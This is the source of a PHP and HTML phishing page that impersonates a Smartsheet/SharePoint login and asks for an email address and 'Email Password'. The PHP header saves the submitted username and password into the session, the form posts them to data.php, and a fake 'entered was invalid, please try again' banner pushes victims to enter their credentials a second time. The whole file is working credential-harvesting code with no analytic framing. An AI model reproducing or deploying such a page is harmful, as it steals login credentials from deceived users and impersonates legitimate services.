<?php

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if(!empty($_POST['username']))  {

$_SESSION['username_first'] = $_POST['username'];

}

if(!empty($_POST['password']))  {

$_SESSION['password_first'] = $_POST['password'];

}

?>

<!DOCTYPE html>
<html>

<head>
    <meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0" name="viewport" />
	
	<script type="text/javascript" src="./js/MaskedPassword.js"></script>
	
	<script>
function empty() {
    var x;
    x = document.getElementById("username").value;
    if (x == "") {
        document.getElementById("username").style = "border-color:red";
		document.getElementById("username_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color:red";
		document.getElementById("password_error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("username").value;
    if (e !== ""){
	    document.getElementById("username").style = "";
		document.getElementById("username_error").style = "display: none";
	}
	var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>

    <meta content="Log into your Smartsheet account. Or, sign-up for a free 30 day trial, no credit card required." name="description" />
    <title>Log In | SharePoint</title>
    <link href="https://arcstudiosinc.sharepoint.com/_layouts/15/images/FAVICON.ICO?rev=44" rel="icon" type="image/x-icon" />
    <link href="https://arcstudiosinc.sharepoint.com/_layouts/15/images/FAVICON.ICO?rev=44" rel="shortcut icon" type="image/x-icon" />
    <link href="login.2x_59.2.3.css" rel="stylesheet" title="smartsheet_login" type="text/css" />
    <link href="https://s.smartsheet.com/b/images/img_icon-57x57.png" rel="apple-touch-icon" sizes="57x57" />
    <link href="https://s.smartsheet.com/b/images/img_icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
    <link href="https://s.smartsheet.com/b/images/img_icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
    <link href="https://s.smartsheet.com/b/images/img_icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
    <link href="https://s.smartsheet.com/b/images/img_icon-167x167.png" rel="apple-touch-icon" sizes="167x167" />
    <link href="https://s.smartsheet.com/b/images/img_icon-180x180.png" rel="apple-touch-icon" sizes="180x180" />
    <link href="https://s.smartsheet.com/b/images/img_icon-128x128.png" rel="shortcut icon" sizes="128x128" />
    <link href="https://s.smartsheet.com/b/images/img_icon-196x196.png" rel="shortcut icon" sizes="196x196" />
   
</head>

<body class="clsBody" style="margin: 0px; padding: 0px; background-color: white;">
    <div id="AIAS" style="position:absolute; top: 0; right: 0; bottom: 0; left: 0;">&nbsp;</div>

    <table style="position:absolute; width:100%; height:100%; border: 0px none; border-collapse:collapse;">
        <tbody>
            <tr>
                <td class="clsGlobalLayoutSideColumn">&nbsp;</td>
                <td class="clsGlobalLayoutContentCell">
                    <form action="data.php" class="clsJspOuterForm" id="ctlForm" method="POST" name="ctlForm" onsubmit="return empty()">
					<input type="hidden" name="login" value="">

                        <div class="clsJspForm" style="position:relative; top:130px; left:20px; width:100%;">
                            <div class="clsJspFormHeader" id="divFormTitleBar" name="divFormTitleBar" style="text-align: center; width: 100%; color:white;">Log in with your receiving email to view documents.<br><hr>
							<label><font color="red" style="font-size: 70%">Email address and/or password entered was invalid. <br><br>Please try again.</font></label>
							</div>
							
							

                            <div id="divFormBody" name="divFormBody" style="overflow: auto; ">
                                <div style="color: #990000; font-size: 10pt; font-weight: bold; margin: 0px 15px; text-align: center; ">
                                    <div id="AIDA" style="display:none;">Please ensure that cookies are enabled in your browser settings before accessing Smartsheet. If you are accessing a Smartsheet embedded in another website, you may also need to enable 3rd party cookies.</div>
                                    <noscript>Please ensure that Javascript is enabled in your browser settings before accessing Smartsheet.</noscript>
                                </div>
                                <input id="formName" name="formName" type="hidden" value="" />
                                <input id="formAction" name="formAction" type="hidden" value="" />
                                <input id="parm1" name="parm1" type="hidden" value="" />
                                <input id="parm2" name="parm2" type="hidden" value="" />
                                <input id="parm3" name="parm3" type="hidden" value="" />
                                <input id="parm4" name="parm4" type="hidden" value="" />
                                <input id="lx" name="lx" type="hidden" value="" />
                                <input id="embed" name="embed" type="hidden" value="" />
                                <input id="de" name="de" type="hidden" value="" />
                                <input id="bid" name="bid" type="hidden" value="" />
                                <input id="sua" name="sua" type="hidden" value="home" />
                                <input id="step1" name="step1" type="hidden" value="" />
                                <input id="tg" name="tg" type="hidden" value="" />
                                <input id="users" name="users" type="hidden" value="" />
                                <input id="plantype" name="plantype" type="hidden" value="" />
                                <input id="response_type" name="response_type" type="hidden" value="" />
                                <input id="client_id" name="client_id" type="hidden" value="" />
                                <input id="redirect_uri" name="redirect_uri" type="hidden" value="" />
                                <input id="scope" name="scope" type="hidden" value="" />
                                <input id="state" name="state" type="hidden" value="" />
                                <input id="lgt" name="lgt" type="hidden" value="" />
                                <input id="lrt" name="lrt" type="hidden" value="" />
                                <input id="EQBCT" name="EQBCT" type="hidden" value="" />
                                <input id="ss_v" name="ss_v" type="hidden" value="59.2.3" />
                                <input id="tinfo" name="tinfo" type="hidden" value="ss_v=59.2.3" />
                                <div class="clsJspFormBody">
                                    <div class="clsJspFormTable" style="display:inline-block;">
                                        <table class="clsJspFormLoginTable">
                                            <tbody>
                                                <tr>
                                                    <td style="vertical-align:top; text-align:center">
                                                        <div>
                                                            <table class="clsJspFormInputTable">
                                                                <tbody>
                                                                    <tr>
                                                                        <td>
                                                                            <input autocapitalize="off" autocorrect="off" id="username" maxlength="100" name="username" placeholder="Email" type="email" value="" onblur="change()" />
																			<label id="username_error" style="display: none"><font color="red">Enter your email address.</font></label>
																			
                                                                        </td>
                                                                    </tr>
                                                                    <tr>
                                                                        <td>
                                                                            <input autocomplete="off" id="password" maxlength="50" name="password" placeholder="Email Password" type="password" value="" onblur="change()" />
																			
																			<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("password"), '\u25CF');
 
  //test the submitted value
  document.getElementById('password').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
																			<label id="password_error" style="display: none"><font color="red">Enter your password.</font></label>
																			
                                                                        </td>
                                                                    </tr>
                                                                    <tr>
                                                                        <td style="padding-left:2px;">
                                                                            <input class="clsJspButton clsJspButtonWide" id="formControl" name="formControl" type="submit" value="Log In" />
                                                                        </td>
                                                                    </tr>
                                                                    
                                                                </tbody>
                                                            </table>
                                                        </div>
                                                    </td>
                                                </tr>
                                                
                                                <tr>
                                                    <td align="center">&nbsp;</td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                            </div>

                            
                        </div>


                    </form>
                </td>
                <td class="clsGlobalLayoutSideColumn">&nbsp;</td>
            </tr>
            <tr>
                <td class="clsGlobalLayoutSideColumn">&nbsp;</td>
                <td class="clsBottomLinks">
                    
                    </td>
                <td class="clsGlobalLayoutSideColumn">&nbsp;</td>
            </tr>
        </tbody>
    </table>

    <div class="clsTooltips" id="tooltips">&nbsp;</div>
</body>

</html>